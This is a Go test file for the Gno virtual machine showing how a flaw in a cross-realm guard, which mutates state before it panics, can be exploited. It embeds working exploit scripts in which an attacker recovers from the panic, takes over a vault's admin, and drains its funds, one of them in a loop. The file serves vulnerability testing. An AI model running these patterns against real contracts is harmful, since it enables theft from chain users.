package vm

import (
	"fmt"
	"strings"
	"testing"

	"github.com/gnolang/gno/gno.land/pkg/gnoland/ugnot"
	gnolang "github.com/gnolang/gno/gnovm/pkg/gnolang"
	"github.com/gnolang/gno/tm2/pkg/crypto"
	"github.com/gnolang/gno/tm2/pkg/sdk"
	"github.com/gnolang/gno/tm2/pkg/std"
	"github.com/stretchr/testify/require"
)

// deployAssignVault is a helper that deploys the victim vault realm
// and funds its address. Returns the victim realm's crypto address.
func deployAssignVault(t *testing.T, env testEnv, ctx sdk.Context, deployer crypto.Address, victimPath string) crypto.Address {
	t.Helper()
	victimAddr := gnolang.DerivePkgCryptoAddr(victimPath)
	victimFiles := []*std.MemFile{
		{Name: "gnomod.toml", Body: gnolang.GenGnoModLatest(victimPath)},
		{Name: "vault.gno", Body: fmt.Sprintf(`package %s

import (
	"chain"
	"chain/banker"
	"chain/runtime"
)

var admin address

func init() {
	admin = address("%s")
}

func SetAdmin(newAdmin address) {
	admin = newAdmin
}

func GetAdmin(cur realm) address {
	return admin
}

func Withdraw(cur realm) {
	caller := runtime.OriginCaller()
	if caller != admin {
		panic("unauthorized")
	}
	b := banker.NewBanker(banker.BankerTypeRealmSend)
	pkgAddr := runtime.CurrentRealm().Address()
	b.SendCoins(pkgAddr, caller, chain.Coins{{"ugnot", 1000000}})
}
`, lastSegment(victimPath), deployer.String())},
	}
	require.NoError(t, env.vmk.AddPackage(ctx, NewMsgAddPackage(deployer, victimPath, victimFiles)))
	env.bankk.SetCoins(ctx, victimAddr, std.MustParseCoins(ugnot.ValueString(5_000_000)))
	return victimAddr
}

func lastSegment(path string) string {
	parts := strings.Split(path, "/")
	return parts[len(parts)-1]
}

// TestCrossRealmAssignRecover_SameTxFundTheft demonstrates end-to-end
// fund theft via Assign2 mutation-before-check using MsgRun.
//
// Attack chain:
//  1. Attacker script calls victim.SetAdmin(attackerAddr) -- non-crossing.
//  2. Assign2 mutates admin in-memory, then DidUpdate panics (cross-realm).
//  3. defer/recover catches the panic. Admin is now corrupted.
//  4. Attacker calls victim.Withdraw(cross) which trusts corrupted admin.
//  5. Funds transfer to attacker. State persists after commit.
func TestCrossRealmAssignRecover_SameTxFundTheft(t *testing.T) {
	env := setupTestEnv()
	ctx := env.vmk.MakeGnoTransactionStore(env.ctx)

	deployer := crypto.AddressFromPreimage([]byte("deployer"))
	t.Log("===deployer: ", deployer)
	attacker := crypto.AddressFromPreimage([]byte("attacker"))
	t.Log("===attacker: ", attacker)

	deployerAcc := env.acck.NewAccountWithAddress(ctx, deployer)
	env.acck.SetAccount(ctx, deployerAcc)
	env.bankk.SetCoins(ctx, deployer, std.MustParseCoins(ugnot.ValueString(30_000_000)))

	attackerAcc := env.acck.NewAccountWithAddress(ctx, attacker)
	env.acck.SetAccount(ctx, attackerAcc)
	env.bankk.SetCoins(ctx, attacker, std.MustParseCoins(ugnot.ValueString(20_000_000)))

	const victimPath = "gno.land/r/test/vault_assign"
	victimAddr := deployAssignVault(t, env, ctx, deployer, victimPath)

	beforeAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	beforeVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")

	// The exploit script:
	// - Calls SetAdmin (non-crossing) which triggers Assign2 mutation
	// - Assign2 mutates admin in-memory, DidUpdate panics (cross-realm guard)
	// - defer/recover catches the panic; admin is now corrupted
	// - Queries GetAdmin(cross) to prove the corruption
	// - Calls Withdraw(cross) which trusts the corrupted admin
	runFiles := []*std.MemFile{
		{Name: "main.gno", Body: fmt.Sprintf(`package main

import "gno.land/r/test/vault_assign"

func main() {
	adminBefore := vault_assign.GetAdmin(cross)
	println("admin before:", adminBefore)

	var panicMsg string
	func() {
		defer func() {
			r := recover()
			if r != nil {
				panicMsg = r.(string)
			}
		}()
		vault_assign.SetAdmin(address("%s"))
	}()
	println("panic caught:", panicMsg)

	adminAfter := vault_assign.GetAdmin(cross)
	println("admin after:", adminAfter)

	vault_assign.Withdraw(cross)
	println("theft complete")
}
`, attacker.String())},
	}

	res, err := env.vmk.Run(ctx, NewMsgRun(attacker, std.Coins{}, runFiles))
	require.NoError(t, err)

	// Verify the cross-realm guard fired but was bypassed.
	require.Contains(t, res, "panic caught:",
		"the cross-realm guard must have fired and been recovered")
	require.Contains(t, res, "external-realm",
		"panic message should reference the cross-realm guard")

	// Verify admin state corruption is visible in the output.
	require.Contains(t, res, "admin before: "+deployer.String(),
		"admin before attack must be the deployer")
	t.Log("===admin before: ", deployer.String())
	require.Contains(t, res, "admin after: "+attacker.String(),
		"admin must have been mutated to attacker despite cross-realm guard")
	t.Log("===admin after: ", attacker.String())

	require.Contains(t, res, "theft complete",
		"execution must continue past the recovered panic")

	// Verify fund movement.
	afterAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	afterVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")

	require.Equal(t, beforeAttacker+1_000_000, afterAttacker,
		"attacker must gain 1,000,000 ugnot")
	require.Equal(t, beforeVictim-1_000_000, afterVictim,
		"victim realm must lose 1,000,000 ugnot")

	// Persist and verify theft survives commit.
	env.vmk.CommitGnoTransactionStore(ctx)
	ctx2 := env.vmk.MakeGnoTransactionStore(env.ctx)
	require.Equal(t, afterAttacker, env.bankk.GetCoins(ctx2, attacker).AmountOf("ugnot"),
		"attacker balance must persist after commit")
	require.Equal(t, afterVictim, env.bankk.GetCoins(ctx2, victimAddr).AmountOf("ugnot"),
		"victim balance must persist after commit")
}

// TestCrossRealmAssignRecover_RealmToRealmFundTheft demonstrates the same
// exploit via realm-to-realm composition (MsgCall to attacker realm).
func TestCrossRealmAssignRecover_RealmToRealmFundTheft(t *testing.T) {
	env := setupTestEnv()
	ctx := env.vmk.MakeGnoTransactionStore(env.ctx)

	deployer := crypto.AddressFromPreimage([]byte("deployer"))
	attacker := crypto.AddressFromPreimage([]byte("attacker"))

	deployerAcc := env.acck.NewAccountWithAddress(ctx, deployer)
	env.acck.SetAccount(ctx, deployerAcc)
	env.bankk.SetCoins(ctx, deployer, std.MustParseCoins(ugnot.ValueString(30_000_000)))

	attackerAcc := env.acck.NewAccountWithAddress(ctx, attacker)
	env.acck.SetAccount(ctx, attackerAcc)
	env.bankk.SetCoins(ctx, attacker, std.MustParseCoins(ugnot.ValueString(20_000_000)))

	const victimPath = "gno.land/r/test/vault_assign_r2r"
	victimAddr := deployAssignVault(t, env, ctx, deployer, victimPath)

	// Deploy attacker realm that exploits the vulnerability.
	const attackerPath = "gno.land/r/test/attacker_assign_r2r"
	attackerFiles := []*std.MemFile{
		{Name: "attacker.gno", Body: fmt.Sprintf(`package attacker_assign_r2r

import "gno.land/r/test/vault_assign_r2r"

func Attack(cur realm) {
	func() {
		defer func() {
			r := recover()
			if r != nil {
				println("panic caught:", r.(string))
			}
		}()
		vault_assign_r2r.SetAdmin(address("%s"))
	}()
	vault_assign_r2r.Withdraw(cross)
	println("theft complete")
}
`, attacker.String())},
		{Name: "gnomod.toml", Body: gnolang.GenGnoModLatest(attackerPath)},
	}
	require.NoError(t, env.vmk.AddPackage(ctx, NewMsgAddPackage(attacker, attackerPath, attackerFiles)))

	beforeAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	beforeVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")

	_, err := env.vmk.Call(ctx, NewMsgCall(attacker, std.Coins{}, attackerPath, "Attack", nil))
	require.NoError(t, err, "Attack tx must succeed (exploit worked)")

	afterAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	afterVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")

	require.Equal(t, beforeAttacker+1_000_000, afterAttacker,
		"attacker must gain 1,000,000 ugnot")
	require.Equal(t, beforeVictim-1_000_000, afterVictim,
		"victim realm must lose 1,000,000 ugnot")

	env.vmk.CommitGnoTransactionStore(ctx)
	ctx2 := env.vmk.MakeGnoTransactionStore(env.ctx)
	require.Equal(t, afterAttacker, env.bankk.GetCoins(ctx2, attacker).AmountOf("ugnot"))
	require.Equal(t, afterVictim, env.bankk.GetCoins(ctx2, victimAddr).AmountOf("ugnot"))
}

// TestCrossRealmAssignRecover_DrainLoop demonstrates that the attacker
// can drain the entire vault in a single transaction by looping the
// recover-then-withdraw pattern.
func TestCrossRealmAssignRecover_DrainLoop(t *testing.T) {
	env := setupTestEnv()
	ctx := env.vmk.MakeGnoTransactionStore(env.ctx)

	deployer := crypto.AddressFromPreimage([]byte("deployer"))
	attacker := crypto.AddressFromPreimage([]byte("attacker"))

	deployerAcc := env.acck.NewAccountWithAddress(ctx, deployer)
	env.acck.SetAccount(ctx, deployerAcc)
	env.bankk.SetCoins(ctx, deployer, std.MustParseCoins(ugnot.ValueString(30_000_000)))

	attackerAcc := env.acck.NewAccountWithAddress(ctx, attacker)
	env.acck.SetAccount(ctx, attackerAcc)
	env.bankk.SetCoins(ctx, attacker, std.MustParseCoins(ugnot.ValueString(20_000_000)))

	const victimPath = "gno.land/r/test/vault_drain"
	victimAddr := deployAssignVault(t, env, ctx, deployer, victimPath)

	beforeAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	beforeVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")
	require.Equal(t, int64(5_000_000), beforeVictim, "vault should start with 5M ugnot")

	// Drain the entire vault in a single tx by looping 5 times (1M each).
	runFiles := []*std.MemFile{
		{Name: "main.gno", Body: fmt.Sprintf(`package main

import "gno.land/r/test/vault_drain"

func main() {
	for i := 0; i < 5; i++ {
		func() {
			defer func() { _ = recover() }()
			vault_drain.SetAdmin(address("%s"))
		}()
		vault_drain.Withdraw(cross)
	}
	println("vault drained")
}
`, attacker.String())},
	}

	res, err := env.vmk.Run(ctx, NewMsgRun(attacker, std.Coins{}, runFiles))
	require.NoError(t, err)
	require.Contains(t, res, "vault drained")

	afterAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	afterVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")

	require.Equal(t, beforeAttacker+5_000_000, afterAttacker,
		"attacker must drain all 5M ugnot from vault")
	require.Equal(t, int64(0), afterVictim,
		"victim vault must be fully drained")

	env.vmk.CommitGnoTransactionStore(ctx)
	ctx2 := env.vmk.MakeGnoTransactionStore(env.ctx)
	require.Equal(t, afterAttacker, env.bankk.GetCoins(ctx2, attacker).AmountOf("ugnot"),
		"drain must persist after commit")
	require.Equal(t, int64(0), env.bankk.GetCoins(ctx2, victimAddr).AmountOf("ugnot"),
		"vault must remain empty after commit")
}

// TestCrossRealmAssign_WithoutRecover_Fails is a negative control.
// It verifies that calling SetAdmin without recover causes the tx to fail,
// proving that recover is the enabling factor for the exploit.
func TestCrossRealmAssign_WithoutRecover_Fails(t *testing.T) {
	env := setupTestEnv()
	ctx := env.vmk.MakeGnoTransactionStore(env.ctx)

	deployer := crypto.AddressFromPreimage([]byte("deployer"))
	attacker := crypto.AddressFromPreimage([]byte("attacker"))

	deployerAcc := env.acck.NewAccountWithAddress(ctx, deployer)
	env.acck.SetAccount(ctx, deployerAcc)
	env.bankk.SetCoins(ctx, deployer, std.MustParseCoins(ugnot.ValueString(30_000_000)))

	attackerAcc := env.acck.NewAccountWithAddress(ctx, attacker)
	env.acck.SetAccount(ctx, attackerAcc)
	env.bankk.SetCoins(ctx, attacker, std.MustParseCoins(ugnot.ValueString(20_000_000)))

	const victimPath = "gno.land/r/test/vault_assign_neg"
	victimAddr := deployAssignVault(t, env, ctx, deployer, victimPath)

	beforeAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	beforeVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")

	// No recover -- the cross-realm panic should abort the entire tx.
	runFiles := []*std.MemFile{
		{Name: "main.gno", Body: fmt.Sprintf(`package main

import "gno.land/r/test/vault_assign_neg"

func main() {
	vault_assign_neg.SetAdmin(address("%s"))
	vault_assign_neg.Withdraw(cross)
}
`, attacker.String())},
	}

	_, err := env.vmk.Run(ctx, NewMsgRun(attacker, std.Coins{}, runFiles))
	require.Error(t, err, "tx must fail when cross-realm panic is not recovered")
	require.Contains(t, err.Error(), "external-realm",
		"error must reference the cross-realm guard")

	// Balances must remain unchanged.
	afterAttacker := env.bankk.GetCoins(ctx, attacker).AmountOf("ugnot")
	afterVictim := env.bankk.GetCoins(ctx, victimAddr).AmountOf("ugnot")

	require.Equal(t, beforeAttacker, afterAttacker,
		"attacker balance must not change on failed tx")
	require.Equal(t, beforeVictim, afterVictim,
		"victim balance must not change on failed tx")
}
